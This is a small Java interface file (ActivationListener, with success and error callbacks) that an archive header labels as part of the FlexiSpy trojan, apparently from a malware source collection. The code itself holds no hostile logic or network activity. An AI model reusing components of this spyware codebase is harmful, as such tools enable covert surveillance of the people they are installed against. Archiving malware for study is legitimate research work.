/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.activation_manager;

import com.vvt.datadeliverymanager.enums.ErrorResponseType;


/**
 * @author Aruna
 * @version 1.0
 * @created 15-Nov-2011 11:24:29
 */
public interface ActivationListener {

	public void onSuccess();

	public void onError(ErrorResponseType errorType, int code, String msg);

}